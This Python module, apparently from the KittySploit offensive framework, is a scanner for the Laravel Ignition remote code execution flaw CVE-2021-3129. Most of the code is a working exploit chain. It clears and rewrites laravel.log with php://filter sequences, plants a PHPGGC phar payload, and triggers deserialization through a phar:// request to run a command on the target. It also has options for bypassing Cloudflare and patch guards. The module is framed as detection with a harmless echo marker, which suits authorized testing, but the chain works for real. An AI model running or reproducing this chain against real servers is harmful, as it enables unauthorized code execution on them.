#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pathlib import Path

from kittysploit import *
from lib.exploits.laravel.ignition import (
    build_solution_payload,
    extract_execution_output,
    find_laravel_version,
    find_log_path,
    ignition_headers,
    ignition_path,
    is_patched_response,
    version_gte,
)
from lib.exploits.laravel.phpggc_chains import LARAVEL_PHPGGC_CHAINS, build_phpggc_argv
from lib.exploits.php.phpggc import Phpggc, encode_phar_for_log_injection
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Laravel Ignition RCE detection (CVE-2021-3129)",
        "description": (
            "Detects CVE-2021-3129 by probing the Laravel Ignition execute-solution endpoint, "
            "extracting the log path and Laravel version, and optionally confirming RCE with a "
            "harmless marker command via PHPGGC."
        ),
        "author": ["joshuavanderpoll", "KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2021-3129",
        "references": [
            "https://github.com/joshuavanderpoll/CVE-2021-3129",
            "https://github.com/ambionics/phpggc",
            "https://nvd.nist.gov/vuln/detail/CVE-2021-3129",
        ],
        "modules": [
            "exploits/multi/http/laravel_cve_2021_3129_rce",
        ],
        "tags": ["web", "scanner", "laravel", "ignition", "php", "rce", "deserialization"],
        "optional_dependencies": ["cloudscraper"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 6,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    FILTER_CLEAR = (
        "php://filter/write=convert.iconv.utf-8.utf-16le"
        "|convert.quoted-printable-encode"
        "|convert.iconv.utf-16le.utf-8"
        "|convert.base64-decode/resource="
    )
    FILTER_CONVERT = (
        "php://filter/read=convert.quoted-printable-decode"
        "|convert.iconv.utf-16le.utf-8"
        "|convert.base64-decode/resource="
    )
    CHAINS = LARAVEL_PHPGGC_CHAINS

    base_path = OptString("/", "Laravel application base path", required=False)
    log_path = OptString("", "Full path to laravel.log (auto-detected when possible)", required=False)
    force = OptBool(False, "Bypass version and HTTP status checks", required=False, advanced=True)
    private_key = OptString("", "X-BYPASS-TOKEN for patched hosts (private patch mode)", required=False)
    active_probe = OptBool(
        False,
        "Confirm RCE with harmless echo marker (requires local PHP + PHPGGC download)",
        required=False,
    )
    marker = OptString("KS3129", "Marker echoed by active probe", required=False, advanced=True)
    php_executable = OptString("php", "Path to PHP executable for active probe", required=False, advanced=True)
    chain = OptString("", "PHPGGC chain for active probe (empty = try all)", required=False, advanced=True)
    cloudflare = OptBool(False, "Use cloudscraper to bypass Cloudflare", required=False, advanced=True)

    def __init__(self, framework=None):
        super().__init__(framework)
        self._resolved_log_path = None

    def _maybe_cloudscraper(self):
        if not self.cloudflare:
            return
        try:
            import cloudscraper  # pylint: disable=import-outside-toplevel
        except ImportError:
            print_warning("cloudscraper not installed; continuing without Cloudflare bypass")
            return
        self.session = cloudscraper.create_scraper(
            browser={"browser": "chrome", "platform": "windows", "mobile": False}
        )

    def _laravel_log_path(self) -> str:
        if self._resolved_log_path:
            return self._resolved_log_path
        return str(self.log_path or "").strip()

    def _headers(self, extra=None):
        return ignition_headers(
            user_agent=self.session.headers.get("User-Agent"),
            private_key=str(self.private_key or ""),
            extra=extra,
        )

    def _exploit_request(self, view_file: str):
        return self.http_request(
            method="POST",
            path=ignition_path(str(self.base_path or "/")),
            json=build_solution_payload(view_file),
            headers=self._headers({"Content-Type": "application/json", "Accept": "*/*"}),
            timeout=max(int(self.timeout or 10), 10),
        )

    def _passive_check(self):
        response = self.http_request(
            method="GET",
            path=ignition_path(str(self.base_path or "/")),
            headers=self._headers(),
            timeout=max(int(self.timeout or 10), 10),
        )
        if not response:
            return False, "No response from ignition endpoint", "", ""

        text = response.text or ""
        if response.status_code == 403 and "Exploit patched" in text:
            return False, "Host patched via index.php guard", "", ""

        if is_patched_response(text):
            return False, "Ignition runnable solutions disabled on target", find_laravel_version(text) or "", ""

        if response.status_code != 405 and not self.force:
            return False, f"Ignition endpoint returned HTTP {response.status_code}, expected 405", "", ""

        body = response.content or b""
        if b"laravel" not in body and "laravel" not in text.lower() and not self.force:
            return False, "Response does not look like Laravel Ignition", "", ""

        laravel_version = find_laravel_version(text) or ""
        if laravel_version and not self.force and version_gte(laravel_version, "8.4.2"):
            return False, f"Laravel {laravel_version} appears patched (>= 8.4.2)", laravel_version, ""

        log_path, _, _ = find_log_path(body)
        if log_path:
            self._resolved_log_path = log_path
        resolved = self._laravel_log_path()
        if not resolved and not self.force:
            return False, "Could not determine laravel.log path; set log_path option", laravel_version, ""

        return True, "Laravel Ignition execute-solution endpoint exposed", laravel_version, resolved

    def _exploit_execute(self, payload: str, log_path: str):
        self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
        cause = self._exploit_request("AA")
        if not cause or cause.status_code != 500:
            self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
            return False, ""

        sent = self._exploit_request(payload)
        if not sent or sent.status_code != 500:
            self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
            return False, ""

        convert = self._exploit_request(f"{self.FILTER_CONVERT}{log_path}")
        if not convert or convert.status_code != 200:
            self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
            return False, ""

        exploited = self._exploit_request(f"phar://{log_path}")
        if not exploited:
            self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
            return False, ""

        ok, output = extract_execution_output(exploited)
        self._exploit_request(f"{self.FILTER_CLEAR}{log_path}")
        return ok, output

    def _active_probe(self, marker: str):
        log_path = self._laravel_log_path()
        if not log_path:
            return False, "log_path not set"

        chain_opt = str(self.chain or "").strip().lower()
        chains = self.CHAINS if not chain_opt else [chain_opt]
        phpggc = Phpggc(
            php_executable=str(self.php_executable or "php"),
            user_agent=self.session.headers.get("User-Agent") or "KittySploit",
            timeout=max(int(self.timeout or 10), 10),
            session=self.session,
        )

        def build_argv(chain_name, _output):
            return build_phpggc_argv(
                str(self.php_executable or "php"),
                phpggc.binary_path,
                chain_name,
                f"echo {marker}",
            )

        for item in phpggc.generate_phar_files(chains, build_argv):
            payload = encode_phar_for_log_injection(Path(item["path"]).read_bytes())
            ok, output = self._exploit_execute(payload, log_path)
            if ok and marker in (output or ""):
                return True, item["name"]
        return False, ""

    def check(self):
        self._maybe_cloudscraper()
        ok, reason, laravel_version, resolved_log = self._passive_check()
        if not ok:
            return {
                "vulnerable": False,
                "reason": reason,
                "confidence": "low",
                "log_path": resolved_log,
                "laravel_version": laravel_version,
            }

        if not self.active_probe:
            return {
                "vulnerable": True,
                "reason": (
                    f"{reason}; Laravel log={resolved_log or 'unknown'}; "
                    f"version={laravel_version or 'unknown'}. "
                    "Passive only — enable active_probe to confirm execution."
                ),
                "confidence": "medium",
                "log_path": resolved_log,
                "laravel_version": laravel_version,
            }

        marker = str(self.marker or "KS3129")
        probed, chain_name = self._active_probe(marker)
        if probed:
            return {
                "vulnerable": True,
                "reason": f"Marker {marker!r} executed via chain {chain_name}",
                "confidence": "high",
                "log_path": resolved_log,
                "laravel_version": laravel_version,
            }

        return {
            "vulnerable": True,
            "reason": "Ignition endpoint exposed but active probe failed",
            "confidence": "medium",
            "log_path": resolved_log,
            "laravel_version": laravel_version,
        }

    def run(self):
        try:
            result = self.check()
            if not result.get("vulnerable"):
                return False

            severity = "critical" if result.get("confidence") == "high" else "high"
            if result.get("confidence") == "medium" and not self.active_probe:
                severity = "medium"

            self.set_info(
                severity=severity,
                cve="CVE-2021-3129",
                reason=result.get("reason", "Laravel Ignition RCE exposure detected"),
                confidence=result.get("confidence", "unknown"),
                log_path=result.get("log_path", ""),
                laravel_version=result.get("laravel_version", ""),
                active_probe=bool(self.active_probe),
            )
            return True
        except Exception:
            return False
